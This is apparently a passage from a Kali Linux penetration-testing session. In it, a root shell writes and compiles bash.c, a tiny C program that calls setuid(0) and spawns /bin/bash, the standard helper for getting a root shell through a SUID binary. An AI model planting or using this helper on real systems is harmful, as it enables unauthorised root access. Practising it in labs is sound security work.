└─# nano bash.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
setuid(0);
system("/bin/bash");
return 0;
}

┌──(kali@kali)-[/tmp]
└─# gcc bash.c -o bash

